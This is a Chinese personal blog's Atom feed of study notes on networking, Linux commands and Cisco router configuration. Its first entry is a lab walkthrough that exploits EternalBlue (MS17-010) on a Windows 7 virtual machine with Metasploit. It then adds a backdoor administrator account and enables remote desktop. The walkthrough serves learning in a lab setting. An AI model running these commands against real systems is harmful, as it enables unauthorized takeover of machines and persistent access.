<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://linjunya.github.io/</id>
    <title>林君需要温习</title>
    <updated>2024-08-14T08:36:33.922Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://linjunya.github.io/"/>
    <link rel="self" href="https://linjunya.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://linjunya.github.io/images/avatar.png</logo>
    <icon>https://linjunya.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, 林君需要温习</rights>
    <entry>
        <title type="html"><![CDATA[Windows永恒之蓝漏洞考古实验]]></title>
        <id>https://linjunya.github.io/post/windows-yong-heng-zhi-lan-lou-dong-kao-gu-shi-yan/</id>
        <link href="https://linjunya.github.io/post/windows-yong-heng-zhi-lan-lou-dong-kao-gu-shi-yan/">
        </link>
        <updated>2024-08-14T08:35:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="windows考古永恒之蓝漏洞">Windows考古——永恒之蓝漏洞</h1>
<h2 id="实验环境">实验环境</h2>
<ul>
<li>kali</li>
<li>windows7</li>
</ul>
<h2 id="实验过程">实验过程</h2>
<ol>
<li>
<p>nmap扫描这个村长有哪些人可以霍霍<img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814142845746.png" alt="image-20240814142845746" loading="lazy"></p>
<ol>
<li><img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814143327784.png" alt="image-20240814143327784" loading="lazy"></li>
<li>这里能看到有119.2这个局域网的网关，</li>
<li>119.131这个有n多个端口的则是局域网内的靶机（445/tcp   open  microsoft-ds）靶机的445端口是开放的，而永恒之蓝利用的就是445端口的SMB服务，操作系统溢出漏洞。，</li>
<li>119.254则是广播口（maybe吧，我现在不是很确定)</li>
<li>119.128则是我本机所在，甚至还能看见打开了ssh服务，我用的第三方软件连接的kali。</li>
</ol>
</li>
<li>
<p>打开msf控制台<img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814144533871.png" alt="image-20240814144533871" loading="lazy"></p>
</li>
<li>
<p>搜索永恒之蓝代号ms17_010<img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814144832632.png" alt="image-20240814144832632" loading="lazy"></p>
</li>
<li>
<p>选中他，你用</p>
<pre><code> use [编号][全名][序号都行]
</code></pre>
</li>
<li>
<p>auxiliary/scanner/smb/smb_ms17_010 是永恒之蓝扫描模块， exploit/windows/smb/ms17_010_eternalblue 是永恒之蓝攻击模块。<br>
一般配合使用，前者先扫描，若显示有漏洞，再进行攻击</p>
<ol>
<li>
<pre><code>use auxiliary/scanner/smb/smb_ms17_010

</code></pre>
</li>
<li>
<pre><code>set rhosts 192.168.119.131

</code></pre>
</li>
<li>
<p>然后run</p>
</li>
<li>
<p>扫描完了就可以开始攻击了</p>
</li>
<li>
<p>选中模块</p>
</li>
<li>
<pre><code>use exploit/windows/smb/ms17_010_eternalblue
</code></pre>
</li>
<li>
<p>设置目标</p>
<pre><code>set rhosts 192.168.119.131
</code></pre>
</li>
<li>
<p>run</p>
</li>
</ol>
</li>
<li>
<figure data-type="image" tabindex="2"><img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814145557319.png" alt="image-20240814145557319" loading="lazy"></figure>
</li>
<li>
<p>攻击完之后，你会得到一个meterpreter，这是你执行攻击的载荷</p>
</li>
<li>
<p>shell一下就可以操控他了<img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814145723382.png" alt="image-20240814145723382" loading="lazy"></p>
</li>
<li>
<p>chcp 65001解决乱码</p>
</li>
<li>
<p>通过shell对靶机进行控制</p>
<ol>
<li>
<pre><code class="language-shell">net user sss 123456 /add
#添加一个新的用户

</code></pre>
</li>
<li>
<pre><code class="language-shell">net user
#查看用户信息
</code></pre>
</li>
<li>
<pre><code class="language-shell">net localgroup Adminstrators sss /add
#将sss添加至管理员组
</code></pre>
</li>
</ol>
</li>
<li>
<p>开启远程桌面功能</p>
<ol>
<li>
<p>查看3389端口状态，是否开启，我们通过这个端口进行远程控制</p>
</li>
<li>
<pre><code class="language-shell">netstat -ano
</code></pre>
</li>
<li>
<figure data-type="image" tabindex="3"><img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814150343363.png" alt="image-20240814150343363" loading="lazy"></figure>
</li>
<li>
<pre><code class="language-shell">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
#设置3389端口开启

</code></pre>
</li>
</ol>
</li>
<li>
<pre><code class="language-shell">rdesktop 192.168.119.131:3389
#远程桌面连接靶机
</code></pre>
</li>
<li>
<p>使用创建的用户进行登录</p>
</li>
<li>
<p>登录成功你就能嘿嘿嘿了。</p>
</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[动态路由plus]]></title>
        <id>https://linjunya.github.io/post/dong-tai-lu-you-plus/</id>
        <link href="https://linjunya.github.io/post/dong-tai-lu-you-plus/">
        </link>
        <updated>2024-08-07T08:03:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="动态路由plus">动态路由plus</h1>
<h2 id="ospf">OSPF</h2>
<h3 id="思科模拟器的配置">思科模拟器的配置</h3>
<ol>
<li>router ospf 1（进程号，爱多少多少没叼事）</li>
<li>network 192.168.1.0 0.0.0.255 area 1</li>
</ol>
<h2 id="使用">使用</h2>
<ol>
<li>router创建ospf进程，号码随意</li>
<li>network设置网络地址，注意要写反掩码，然后划分地界，一头的互相都了解彼此。</li>
</ol>
<h2 id="rip和ospf有什么区别">RIP和OSPF有什么区别</h2>
<p><strong>RIP通告的是谣言</strong></p>
<p>谣言就是路由，但是网络波动会导致谣言的同步时间非常久，所以RIP的收敛时间很长</p>
<p><strong>OSPF通告的是链路状态</strong></p>
<p>OSPF想要获得路由信息需要通过各个路由器的链路状态数据库进行计算SPF才能获得。所以OSPF无法支撑过大的网络OSPF的链路状态同步非常快，所以ospf基本没有多少收敛时间。</p>
<p>rip配得快，传得慢，ospf比rip多几个步骤但是传得快。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[RIP]]></title>
        <id>https://linjunya.github.io/post/rip/</id>
        <link href="https://linjunya.github.io/post/rip/">
        </link>
        <updated>2024-08-07T07:38:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="rip">RIP</h1>
<h2 id="rip是个啥">RIP是个啥</h2>
<p>RIP协议（Routing Information Protocol，路由信息协议）是一种基于距离矢量的内部网关协议，即根据跳数来度量路由开销，进行路由选择。</p>
<p>相比于其它路由协议（如OSPF、ISIS等），RIP协议实现更简单，对带宽、配置和管理等要求也更低，但受到路由跳数和收敛速度的限制，跳数大于15就认为网络不可达，所以无法用在大型复杂网络中。</p>
<p>原文链接：https://blog.csdn.net/m0_73995538/article/details/131095351</p>
<h2 id="用处">用处</h2>
<p>作为动态路由还有点用，能解决一些静态路由做不到的。</p>
<p>在出现动态路由之前，静态路由有几个问题无法解决：</p>
<p>**<em>问题一：<em><strong>当网络拓扑结构和链路状态发生变化，需要对路由器的静态路由信息</strong>进行大范围修改，工作复杂度高。</em></em></p>
<p>***问题二：***网络发生故障时，<strong>不能重选路由</strong>，很可能使路由失败。</p>
<h2 id="限制">限制</h2>
<p>RIP适用于<strong>中小型网络</strong>，因为RIP是基于距离矢量的算法(D-V算法)。由于其<strong>只能支持0-15跳,<strong>第十六跳会被标记成无限大或不可达。所以在整个网络中，只能有16个路由器相互成为rip邻居路由器，由于以上原因，所以RIP只能</strong>应用于中小型网络</strong></p>
<h2 id="思科模拟器命令">思科模拟器命令</h2>
<ol>
<li>router rip</li>
<li>network 192.168.1.0</li>
<li>network 192.168.2.0</li>
</ol>
<h2 id="做法">做法</h2>
<ol>
<li>启动rip</li>
<li>把身边的邻居加入进去，开始散布谣言，让路由上的每个人都知道，who is我的邻居</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[linux -2]]></title>
        <id>https://linjunya.github.io/post/linux-2/</id>
        <link href="https://linjunya.github.io/post/linux-2/">
        </link>
        <updated>2024-08-07T00:42:45.000Z</updated>
        <content type="html"><![CDATA[<h1 id="命令">命令</h1>
<h2 id="win中如何获取帮助">win中如何获取帮助</h2>
<p>win中我们用任何指令+/？</p>
<p>拿ping来举例</p>
<h2 id="退出5种方式">退出（5种方式）</h2>
<ol>
<li>q</li>
<li>exit</li>
<li>c(ctrl)</li>
<li>d都用ctrl</li>
<li>z</li>
</ol>
<h2 id="linux种如何获取帮助">linux种如何获取帮助</h2>
<p>man ping （man手册前面）<br>
info ping（<br>
ping -affg（非法参数 获得报错信息）<br>
大多数 简易帮助可以用 --help，-h（不正规）</p>
<p>man和info比较正规，用起来方便</p>
<h2 id="文件系统的相关指令">文件系统的相关指令</h2>
<table>
<thead>
<tr>
<th>windows</th>
<th>linux</th>
<th>描述信息</th>
</tr>
</thead>
<tbody>
<tr>
<td>--</td>
<td>pwd</td>
<td>显示当前所在目录的绝对路径</td>
</tr>
<tr>
<td>dir</td>
<td>ls</td>
<td>查看指定目录中有哪些内容</td>
</tr>
<tr>
<td>cd</td>
<td>cd</td>
<td>进入指定目录</td>
</tr>
<tr>
<td>--</td>
<td>touch</td>
<td>新建文件</td>
</tr>
<tr>
<td>mkdir</td>
<td>mkdir</td>
<td>新建目录</td>
</tr>
<tr>
<td>rmdir</td>
<td>rmdir</td>
<td>删除空目录</td>
</tr>
<tr>
<td>del</td>
<td>rm</td>
<td>删除文件</td>
</tr>
<tr>
<td>--</td>
<td>rm -r</td>
<td>删除非空目录</td>
</tr>
<tr>
<td>copy</td>
<td>cp</td>
<td>拷贝文件或目录</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>win</th>
<th>lin</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>move</td>
<td>mv</td>
<td>剪切</td>
</tr>
<tr>
<td>find</td>
<td>find</td>
<td>查找文件或者目录</td>
</tr>
<tr>
<td>--</td>
<td>ln</td>
<td>软硬链接</td>
</tr>
<tr>
<td>notepad</td>
<td>more less head tail cat tac nl</td>
<td>查看文件内容</td>
</tr>
<tr>
<td>notepad</td>
<td>vi</td>
<td>编辑文件</td>
</tr>
</tbody>
</table>
<h2 id="绝对路径相对路径">绝对路径，相对路径</h2>
<p>从树根开始描述就是绝对路径<br>
从当前位置开始描述就是相对路径</p>
<p>.当前目录<br>
..返回上级目录</p>
<p>注意Linux中要用/，Windows中才有\。<br>
文件夹本质上就是文件，也不能跟文件同名</p>
<p>mv ./test ./test1剪切当前文件下的test，复制到当前文件夹下，命名成test1</p>
<h2 id="查找">查找</h2>
<p>find根据文件名，大小，时间查找<br>
find / -name cdrom<br>
文件名加<em>可以模糊查询<br>
cdrom</em>后面有后缀的也可以<br>
*cdrom只要有他的都查找<br>
find 从树根开始 根据文件名查找 文件名</p>
<p>whereis ping指令查找。</p>
<p>ln 硬链接 指向同一个扇区<br>
软链接， 快捷方式，指向另一个文件，通过这个文件来访问扇区</p>
<p>所以我们删除并不是在删除扇区的数据，实际上是在删除节点。<br>
彻底删除粉碎数据，也是把数据重写，让他不成段，就永远丢失数据了。</p>
<p>常规文件都是硬链接，访问的都是iNode这个节点。</p>
<p>ll是 ls -l 缩写<br>
显示详细内容</p>
<p>ln 源节点 目标节点 （硬链接</p>
<p>ln -s 源节点 目标节点 （软链接</p>
<h2 id="查看">查看</h2>
<p>more 可翻页<br>
less 进入模式，可以回返<br>
head 前十行<br>
tail 后十行<br>
cat 不能回返<br>
tac nl 不知道有什么稀奇的</p>
<p>退出vi<br>
q！<br>
进程管理器<br>
kill语句杀掉这个进程<br>
kill +进程号</p>
<h2 id="vi编辑器">vi编辑器</h2>
<ol>
<li>主模式</li>
<li>编辑模式</li>
<li></li>
</ol>
<p>.开头隐藏文件<br>
swp帮你偷偷保存的缓存文件，保证你非正常关闭时候，也能保存文件<br>
ls -a查看<br>
最好删掉，<br>
rm -f test（文件名）*</p>
<h3 id="主模式">主模式</h3>
<p>yy复制一行，p粘贴<br>
5 yy 复制5行，p粘贴<br>
yy表示复制行， n yy 表示复制n行<br>
剪切 dd 表示剪切行，不粘贴就当删除用了。<br>
yw 复制单词 ，光标停留到首字母，一直复制到空格都复制完<br>
dw剪切单词，同上<br>
n yw ，n dw 同上<br>
-，会把单词分隔开，-本身当作一个单词，_不当成单词，属于常规的名称。</p>
<p>/+要查找的字符串，按n找下一个。</p>
<h2 id="可视行模式">可视行模式</h2>
<p>shift +v进入，选中，进入前调整好光标。<br>
：e 要导出的文件名。</p>
<p>：setnumber出现行号<br>
:   setnonumber不出现行号<br>
：set nu出现行号<br>
：set nonu不出现行号</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[linux -1]]></title>
        <id>https://linjunya.github.io/post/linux-1/</id>
        <link href="https://linjunya.github.io/post/linux-1/">
        </link>
        <updated>2024-08-06T05:32:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="linux">linux</h1>
<h2 id="机械硬盘的结构">机械硬盘的结构</h2>
<p>数字信号精准，模拟信号不精准，但方便长距离传播。<br>
调制  数字--》模拟<br>
解调 模拟--》数字<br>
cpu1字节对齐，磁盘扇区512字节对齐。<br>
磁盘不能拆，不能蒙尘，磁盘再转，就会损坏。</p>
<p>开机不能乱抖动，也会伤磁盘<br>
读8个扇区，再翻译<br>
最小读取单位，8个扇区。4k对齐<br>
文件存储结构，必须是4k的整数倍。<br>
颗粒度</p>
<p>磁盘的簇<br>
最小4k</p>
<p>格式化，就是摆放文件系统。</p>
<p>文件系统</p>
<p>前序后序，运算</p>
<p>/主分区   30G<br>
/home 用户分区 剩下所有都分给他<br>
swap 交互分区  512M<br>
虚拟内存 工作原理<br>
用磁盘存储，认为暂时不需要的东西。然后调用内存去存新的，不单纯是存储，经历了一次写。<br>
/boot引导分区256M  让计算机启动的过程中找到操作系统<br>
bios 检查硬件 ，寻找操作系统的入口，</p>
<p>动态服务器，找近的，安排游戏服务器。</p>
<p>休眠前，先用虚拟内存存储数据，然后开始，关闭内存，cpu等。</p>
<h1 id="加密">加密</h1>
<p>md5加密不可逆，保存账号信息时候使用。<br>
现在qq做的<br>
所以现在不能找回，只能重置，通过上传到服务器，用另一端密文来覆盖。</p>
<h2 id="非对称式加密算法">非对称式加密算法</h2>
<ol>
<li></li>
</ol>
<h1 id="指令">指令</h1>
<h2 id="系统管理">系统管理</h2>
<ul>
<li>帮助</li>
<li>历史</li>
<li>开关机</li>
<li>挂起</li>
</ul>
<p>shutdown -r 重启<br>
shutdown -now 现在关机<br>
reboot 重启<br>
init[0-6]0 关机</p>
<ol>
<li>重启成单人模式 （一个登录，其他就不能登录）配置环境时候用。</li>
<li>保留</li>
<li>默认启动（多人模式）本地终端有6个，还可以再远程连接cpu有多强，你就可以登多少</li>
<li>保留</li>
<li>若安装图形界面，默认启动就启动图形界面</li>
<li>重启</li>
</ol>
<h3 id="注销和登录">注销和登录</h3>
<ol>
<li>bios对硬件自检</li>
<li>boot引导操作系统入口启动</li>
<li>core加载成功（1-3内核流程）</li>
<li>用户登录</li>
<li>看到windows的desktop</li>
</ol>
<p>注销 logout<br>
登录  login<br>
在终端软件，使用都是注销，在linux上都是重新登录<br>
switch user 可以不注销，进行登录</p>
<h2 id="历史执行命令">历史执行命令</h2>
<p>history</p>
<h2 id="文件系统指令">文件系统指令</h2>
<ul>
<li>
<p>进入目录</p>
</li>
<li>
<p>创建文件，文件夹</p>
</li>
<li>
<p>拷贝文件或目录，剪切，看文件，看目录</p>
</li>
<li>
<p>编辑文件</p>
<h2 id="账号管理">账号管理</h2>
<ul>
<li>新增账号</li>
<li>删除账号</li>
<li>修改账号</li>
</ul>
</li>
</ul>
<h2 id="权限管理">权限管理</h2>
<p>权限分布，配置权限，配置文件拥有者，文职文案金的基础权限</p>
<h2 id="进程管理">进程管理</h2>
<p>查看，查找，杀死进程</p>
<h2 id="磁盘管理">磁盘管理</h2>
<p>查看磁盘分区情况，分区，格式化</p>
<h2 id="内存管理">内存管理</h2>
<p>查看内存使用情况</p>
<h2 id="输入输出配置重定向管道运算">输入输出配置，重定向，管道运算</h2>
<h2 id="文件系统挂载">文件系统挂载</h2>
<h2 id="等">等</h2>
<ul>
<li>定时任务</li>
<li>软件安装  标准和yum安装，以及yum的本地安装</li>
<li>远程下载</li>
<li>压缩和解压缩</li>
<li>防火墙</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[网络相关的面试题]]></title>
        <id>https://linjunya.github.io/post/wang-luo-xiang-guan-de-mian-shi-ti/</id>
        <link href="https://linjunya.github.io/post/wang-luo-xiang-guan-de-mian-shi-ti/">
        </link>
        <updated>2024-08-06T02:34:34.000Z</updated>
        <content type="html"><![CDATA[<h1 id="网络">网络</h1>
<h2 id="物理地址几个字节">物理地址几个字节？</h2>
<p>6个字节</p>
<h2 id="ipv4地址和物理地址分别多少字节">ipv4地址和物理地址分别多少字节</h2>
<p>4个字节 6个字节</p>
<h2 id="ip地址姓名分界">ip地址姓名分界</h2>
<p>子网掩码</p>
<h2 id="ipv4-a类地址特征">ipv4 ，a类地址特征</h2>
<p>在IP地址的四段号码中，第一段号码为网络号码，剩下的三段号码为本地计算机的号码。<br>
范围，<br>
二进制特征<br>
B类10，<br>
C类110</p>
<h2 id="交叉线的线序">交叉线的线序</h2>
<p>13，26交叉</p>
<h2 id="双工和半双工有什么区别">双工和半双工有什么区别</h2>
<p>半双工，对讲机<br>
全双工，电话</p>
<h2 id="带宽和网速的区别">带宽和网速的区别</h2>
<p>网速x带宽=下载速度（吞吐量）</p>
<h2 id="19216832和19216827子网掩码23位是邻居">192.168.3.2和192.168.2.7，子网掩码23位，是邻居</h2>
<h2 id="村庄的范围是多少32-27">村庄的范围是多少？3.2   2.7</h2>
<p>192.168.2.0-192.168.3.255</p>
<h2 id="什么场合电脑通信需要发给网关">什么场合，电脑通信需要发给网关</h2>
<p>访问外网，通过网关，作邮递员，帮你们访问。</p>
<h2 id="访问邻居报文里应该有什么">访问邻居，报文里应该有什么</h2>
<p>目标ip 目标mac 自己的mac，arp呼喊，找到邻居的mac</p>
<h2 id="arp记忆老化时间-2min">arp记忆（老化）时间 2min</h2>
<h2 id="怎么获得动态地址">怎么获得动态地址</h2>
<p>dhcp协议</p>
<h2 id="动态地址获取不了怎么排查问题">动态地址获取不了，怎么排查问题</h2>
<ol>
<li>电脑先发广播，请求地址，检查路由器是否配置，配置之后，必须存盘，电脑中服务是否开启</li>
<li>看dhcp客户端</li>
</ol>
<h2 id="哪些地方获取域名对应的ip地址">哪些地方获取域名对应的ip地址</h2>
<p>dns 本地域名<br>
劫持域名 本地域名可以干</p>
<h2 id="vlan中access-trunk的区别">vlan中access trunk的区别。</h2>
<p>Access模式：<br>
当Access接口从主机上收到一个不带VLAN标签的数据帧时，交换机会给这个帧加上一个与PVID（端口VLAN ID）一致的VLAN标签。<br>
当Access接口要发送一个带VLAN标签的数据帧给主机时，交换机会检查该帧的VLAN ID是否与自己的PVID相同。若相同，则去掉VLAN标签后发送数据帧；若不同，则直接丢弃该数据帧。<br>
Trunk模式：<br>
在Trunk模式下，数据帧在传输过程中始终带有VLAN标签，以便目标设备能够识别数据帧所属的VLAN。<br>
Trunk端口上的数据帧可以来自多个VLAN，因此它们必须被正确地打上VLAN标签以进行区分和转发。</p>
<h2 id="mac地址表有几个字段">mac地址表有几个字段</h2>
<p>也叫二层转发表，3，vlan编号，mac地址，在哪个端口学到的。</p>
<h2 id="三层的路由表中有哪些字段">三层的路由表中有哪些字段</h2>
<ol>
<li>网络号</li>
<li>掩码</li>
<li>下一跳的接口/地址</li>
</ol>
<h2 id="nat技术用来干嘛">nat技术用来干嘛</h2>
<ol>
<li>ipv4地址的复用</li>
<li>地址替换，源ip替换成公网ip</li>
</ol>
<h2 id="rip路由协议">rip路由协议</h2>
<p>基于谣言的协议</p>
<h2 id="ospf协议">ospf协议</h2>
<p>基于链路状态的协议</p>
<h2 id="为什么用思科公用的好转">为什么用思科，公用的，好转。</h2>
<h2 id="做过什么项目一个简易的校园网的拓扑">做过什么项目，一个简易的校园网的拓扑</h2>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[校园网项目代码]]></title>
        <id>https://linjunya.github.io/post/xiao-yuan-wang-xiang-mu-dai-ma/</id>
        <link href="https://linjunya.github.io/post/xiao-yuan-wang-xiang-mu-dai-ma/">
        </link>
        <updated>2024-08-06T00:19:18.000Z</updated>
        <content type="html"><![CDATA[<h1 id="inside-outside-漏斗代码">inside outside 漏斗代码</h1>
<p>Router(config)# interface GigabitEthernet0/1  # 假设这是内部接口<br>
Router(config-if)# ip nat inside<br>
Router(config)# interface GigabitEthernet0/0  # 假设这是外部接口<br>
Router(config-if)# ip nat outside</p>
<p>Router(config)# access-list 10 permit 192.168.1.0 0.0.0.255  # 允许192.168.1.0/24网段的流量</p>
<p>Router(config)# ip nat pool NAT_POOL 203.0.113.1 203.0.113.10 netmask 255.255.255.0<br>
Router(config)# ip nat inside source list 10 pool NAT_POOL</p>
<p>Router(config)# ip nat inside source list 10 interface GigabitEthernet0/0 overload</p>
<p>Router(config)# ip nat inside source static tcp 192.168.1.10 80 203.0.113.1 8080</p>
<p>Router(config)# ip route 0.0.0.0 0.0.0.0 203.0.113.1  # 默认路由指向外部网关</p>
<h2 id="示例扩展acl以拒绝来自特定ip的流量">示例：扩展ACL以拒绝来自特定IP的流量</h2>
<p>Router(config)# access-list 101 deny   ip host 1.2.3.4 any<br>
Router(config)# access-list 101 permit ip any any<br>
Router(config)# interface GigabitEthernet0/0<br>
Router(config-if)# ip access-group 101 in</p>
<h1 id="dns服务器的设置">dns服务器的设置</h1>
<h1 id="dhcp动态分配">dhcp动态分配</h1>
<h1 id="单臂trunk">单臂trunk</h1>
<h1 id="重启">重启</h1>
<p>reload</p>
<h1 id="ospf">ospf</h1>
<p>router ospf 进程编号（随意）<br>
network 192.168.1.0 0.0.0.255 area 1<br>
router id 192.168.1.1 把第一个占为id<br>
do show ip ospf neighbro</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[数据通信]]></title>
        <id>https://linjunya.github.io/post/shu-ju-tong-xin/</id>
        <link href="https://linjunya.github.io/post/shu-ju-tong-xin/">
        </link>
        <updated>2024-08-05T00:36:42.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vlan复用-trunk">vlan复用 trunk</h1>
<h1 id="接口加入vlan-access-trunk">接口加入vlan access trunk</h1>
<h1 id="默认路由-特点">默认路由 特点</h1>
<h1 id="面试题">面试题</h1>
<ol>
<li>网线连接方式 分为 交叉线 和 平行线</li>
<li>交叉方法 1326</li>
<li>ping ICMP 三种ping的结果  1 time out 请求超时，主机无响应（邻居无响应，远端设备无响应）  2 could not find host 未知主机，域名解析失败（网是通的，域名解析不存在) 3 dest host unreachable  目标主机不可达（村长不知道往哪发，村长没有路由）（是邻居，开了防火墙，或者不存在）</li>
</ol>
<h1 id="动态路由">动态路由</h1>
<h2 id="rip">RIP</h2>
<p>router rip<br>
network 村庄号<br>
三层网络允许成环，二层网络不允许成环（arp广播循环），路由是三层，交换机是二层。<br>
路由时允许成环的，会取长度最小值。rip 路由权重是长度。只有长度</p>
<p>谣言路由，拔出一段网线，路由传一会好了一会坏了。确定好了坏了这个过程叫收敛。<br>
收敛一般需要十几分钟。rip协议的优点就是简单。</p>
<h2 id="open-spf">Open SPF</h2>
<p>ShortPathFirst<br>
最短路径算法<br>
直接算出整个拓扑的路线，而rip只有邻居几个才知道，但是这个opsf消耗的cpu，内存会更多，所以只适合不算太大的网络，更新链路状态。</p>
<h2 id="rip和ospf区别">rip和ospf区别</h2>
<ol>
<li>rip通告的是谣言（谣言就是路由，但是网络波动会导致谣言的同步时间很久，所以rip收敛的时间很长）rip基于矢量的协议，矢量路由协议。</li>
<li>ospf通告的是<strong>链路状态</strong>（获得路由信息通过计算过程，通过各个路由器的链路状态数据库进行路由计算spf才能获得，所以ospf无法支撑较大网络）（ospf的链路状态同步很快，所以ospf基本没什么收敛时间）</li>
</ol>
<p>router ospf 进程编号（随意）<br>
network 192.168.1.0 0.0.0.255 area 1<br>
router id 192.168.1.1 把第一个占为id<br>
do show ip ospf neighbro</p>
<p>通过area 把一群路由器 搞成一个路由器，这样ospf像远端扩展</p>
<p>路由协议相互独立的。</p>
<p>redistribute rip<br>
重分发<br>
router rip<br>
redistribute ospf 1 metric 1<br>
version 2</p>
<p>一个dns<br>
两个web服务器 一个学校官网 一个校园论坛bbs<br>
做一个nat，外网不准访问校园网</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[cloud-6]]></title>
        <id>https://linjunya.github.io/post/cloud-6/</id>
        <link href="https://linjunya.github.io/post/cloud-6/">
        </link>
        <updated>2024-08-03T00:29:08.000Z</updated>
        <content type="html"><![CDATA[<h1 id="交换机">交换机</h1>
<p>spanning tree protocol<br>
stp<br>
生成树协议<br>
在二层进行网络环路探测，将同一个局域网中所有的设备以树状结构进行排布<br>
消除树状结点横向的环路连接</p>
<p>树根，mac地址最小的那个交换机就是</p>
<p>交换机激活的一瞬间，开始竞争树根，彼此间开始协商。</p>
<p>破除环路，防止广播包反复传递</p>
<p>路由成环可以，交换机不行，组成环是为了分流，保证路径一定要是通的。<br>
静态路由没问题，动态路由要小心点</p>
<p>ip/mask 下一跳jump<br>
取出目的ip地址<br>
if（目的ip地址==ip&amp;mask）<br>
使用这条路由的下一条，投递报文<br>
else<br>
继续下一条路由诊断</p>
<p><strong>优先级</strong><br>
本机路由，直连路由，静态路由（配置的非邻居的）</p>
<p>L，C，S<br>
两条静态，先配先生效<br>
默认路由不一样。<br>
0.0.0.0 0.0.0.0 （x.x.x.x）经过的网关<br>
优先等级最烂，有其他的就用其他的路route</p>
<p>IP routing 启动路由 三层交换机<br>
config : ip rounting<br>
切换trunk要先切换模式<br>
sw tr  en d<br>
三层交换机，要interface vlan 2 在no shutdown</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[cloud-5]]></title>
        <id>https://linjunya.github.io/post/cloud-5/</id>
        <link href="https://linjunya.github.io/post/cloud-5/">
        </link>
        <updated>2024-08-02T00:40:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="四层结构中的每一层结构分别有哪些协议">四层结构中的每一层结构分别有哪些协议</h1>
<p>二层协议：arp   ，rarp（arp和逆arp） stp（生成树协议，防止环路）（都是通过，网卡实现）<br>
三层协议：icmp（ping包）为什么没有传输层信封，因为他就是保证ping之后，确定能到达，igmp，ip<br>
四层（传输层）：tcp udp</p>
<h1 id="考证">考证</h1>
<ol>
<li>h3c</li>
<li>hcie<br>
(作为资质，不然不卖设备)</li>
</ol>
<h1 id="模拟器">模拟器</h1>
<p>思科 cisco</p>
<h1 id="单工双工半双工全双工">单工双工，半双工，全双工</h1>
<h1 id="交换机和hub的区别">交换机和Hub的区别</h1>
<p>Hub群发，交换机要学习只发给一个人，第一次是广播，Hub一直群发。</p>
<p>以前手摇交换机，是人工，</p>
<p>二层转发表，交换机</p>
<p>三层转发表，路由器</p>
<p>交换机为什么不广播，而是群发</p>
<h1 id="vlan技术">VLAN技术</h1>
<p>交换机，物理局域网，分裂成两个更小的逻辑局域网</p>
]]></content>
    </entry>
</feed>